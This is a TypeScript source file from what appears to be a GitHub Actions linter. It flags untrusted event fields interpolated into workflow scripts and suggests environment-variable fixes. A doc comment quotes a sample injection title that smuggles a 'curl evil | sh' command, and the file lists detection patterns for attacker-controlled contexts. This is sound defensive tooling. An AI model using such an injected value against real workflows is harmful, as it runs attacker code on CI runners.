import type { Finding } from "../types.js";
import { positionIn } from "../workflow.js";
import type { Step, Workflow } from "../workflow.js";

/**
 * Contexts an attacker controls: issue and PR text, branch names, commit
 * messages and author fields. Interpolating them into a shell script lets a
 * crafted title such as `"; curl evil | sh #` run commands in the runner.
 * Based on GitHub's "Security hardening for GitHub Actions" guide.
 */
const untrusted = [
  /^github\.event\.(issue|pull_request|discussion)\.(title|body)$/,
  /^github\.event\.(comment|review|review_comment)\.body$/,
  /^github\.event\.pull_request\.head\.(ref|label|repo\.default_branch)$/,
  /^github\.event\.pages\[[^\]]*\]\.page_name$/,
  /^github\.event\.pages\.\*\.page_name$/,
  /^github\.event\.commits(\[[^\]]*\]|\.\*)\.(message|author\.(email|name))$/,
  /^github\.event\.head_commit\.(message|author\.(email|name))$/,
  /^github\.event\.workflow_run\.(head_branch|head_commit\.(message|author\.(email|name)))$/,
  /^github\.head_ref$/,
];

const expressionRE = /\$\{\{\s*(.*?)\s*\}\}/g;

export interface Injection {
  /** The full `${{ ... }}` text. */
  text: string;
  /** The context path, e.g. github.event.issue.title. */
  context: string;
}

/** Finds untrusted contexts used directly inside a script. */
export function findInjections(script: string): Injection[] {
  const found: Injection[] = [];
  for (const m of script.matchAll(expressionRE)) {
    const context = (m[1] ?? "").trim();
    if (untrusted.some((re) => re.test(context))) {
      found.push({ text: m[0], context });
    }
  }
  return found;
}

/** Derives an environment variable name: github.event.issue.title -> ISSUE_TITLE. */
export function envName(context: string): string {
  const parts = context
    .replace(/\[[^\]]*\]/g, "")
    .split(".")
    .filter((p) => p !== "github" && p !== "event" && p !== "*");
  const tail = parts.slice(-2).join("_");
  return tail.replace(/[^A-Za-z0-9]+/g, "_").toUpperCase();
}

export interface Script {
  text: string;
  /** The YAML scalar holding the script, for exact positions. */
  node: unknown;
  fixable: boolean;
}

/** The scripts a step runs: run: and the script input of actions/github-script. */
export function scripts(step: Step): Script[] {
  const out: Script[] = [];
  if (step.run !== undefined) out.push({ text: step.run, node: step.node.get("run", true), fixable: true });
  // actions/github-script evaluates its `script` input as JavaScript.
  const script = step.with.script;
  if (step.uses?.startsWith("actions/github-script@") && script !== undefined) {
    out.push({ text: script, node: step.node.getIn(["with", "script"], true), fixable: false });
  }
  return out;
}

export function checkInjection(wf: Workflow): Finding[] {
  const findings: Finding[] = [];
  for (const job of wf.jobs) {
    for (const step of job.steps) {
      for (const { text, node, fixable } of scripts(step)) {
        const seen = new Map<string, number>();
        for (const inj of findInjections(text)) {
          const n = seen.get(inj.text) ?? 0;
          seen.set(inj.text, n + 1);
          findings.push({
            ruleId: "GHA001",
            severity: "high",
            file: wf.file,
            ...positionIn(wf, node, inj.text, n),
            message: `${inj.context} is interpolated into a script; a crafted value can run arbitrary commands`,
            help: fixable
              ? `Pass it through an environment variable: env: { ${envName(inj.context)}: ${inj.text} } and use "$${envName(inj.context)}" in the script.`
              : "Read it in JavaScript from context.payload instead of interpolating it into the script.",
            fixable,
          });
        }
      }
    }
  }
  return findings;
}
